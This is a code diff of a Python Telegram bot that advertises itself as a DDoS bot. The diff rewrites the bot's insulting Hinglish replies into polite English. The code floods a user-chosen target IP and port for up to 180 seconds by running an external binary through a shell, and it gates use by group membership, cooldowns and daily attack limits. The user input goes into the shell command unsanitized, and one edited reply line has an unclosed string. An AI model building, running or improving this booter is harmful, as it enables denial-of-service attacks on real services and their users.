@@ -64,18 +64,18 @@ def handle_attack(message):
 
     # Ensure user is in the group
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "ye bot sirf group pr chalega chanal join kro access milega Join - https://t.me/RRAJARAJ_04")
+        bot.reply_to(message, "This bot can only be used in the specified group. Join - https://t.me/c/2374071862/5095)
         return
 
     # Ensure user is a member of the channel
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"pahle join krle lode{CHANNEL_USERNAME} to use this bot.")
+        bot.reply_to(message, f"You must join {CHANNEL_USERNAME} to use this bot.")
         return
 
     # Check global cooldown
     if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
         remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
-        bot.reply_to(message, f"🤣 PAHLE SE ATTACK LGA H LODE WAIT KR {remaining_time} seconds.")
+        bot.reply_to(message, f"An attack is already in progress. Please wait {remaining_time} seconds.")
         return
 
     # Initialize user data if not present
@@ -86,7 +86,7 @@ def handle_attack(message):
 
     # Check user's daily attack limit
     if user['attacks'] >= ATTACK_LIMIT:
-        bot.reply_to(message, f"aaj ka limit khatam lode {ATTACK_LIMIT}. kal fir lgana😃.")
+        bot.reply_to(message, f"You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
         return
 
     # Parse command arguments
@@ -105,16 +105,16 @@ def handle_attack(message):
         return
 
     if time_duration > 180:
-        bot.reply_to(message, "ABE LODE FREE KA H TO 180 SE JADA MAREGA KYA.")
+        bot.reply_to(message, "Error: Attack duration cannot exceed 180 seconds.")
         return
 
     # Execute the attack via the binary
     full_command = f"./raja {target} {port} {time_duration} 800"
     try:
-        bot.reply_to(message, f"😭SEVER CHUD GYA😡: {target}, Port: {port}, Time: {time_duration} seconds.\n"
-                              f"teri baki attack limit : {ATTACK_LIMIT - user['attacks'] - 1}")
+        bot.reply_to(message, f"Attack started on Target: {target}, Port: {port}, Time: {time_duration} seconds.\n"
+                              f"Remaining attacks for you: {ATTACK_LIMIT - user['attacks'] - 1}")
         subprocess.run(full_command, shell=True)
-        bot.reply_to(message, f"attack khatam land: {target}, Port: {port}, Time: {time_duration} seconds.")
+        bot.reply_to(message, f"Attack completed on Target: {target}, Port: {port}, Time: {time_duration} seconds.")
     except Exception as e:
         bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
         return
@@ -132,14 +132,14 @@ def check_cooldown(message):
         remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
         bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
     else:
-        bot.reply_to(message, "cooldown lga h.")
+        bot.reply_to(message, "No global cooldown. You can initiate an attack.")
 
 # Command to check remaining attacks for a user
 @bot.message_handler(commands=['check_remaining_attack'])
 def check_remaining_attack(message):
     user_id = str(message.from_user.id)
     if user_id not in user_data:
-        bot.reply_to(message, f"teri baki attack {ATTACK_LIMIT}  aaj ki.")
+        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
     else:
         remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
         bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")
@@ -196,7 +196,7 @@ def view_users(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/c/2374071862/5095 "
+    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/c/2374071862/5095"
     bot.reply_to(message, response)
 
 # Function to reset daily limits automatically
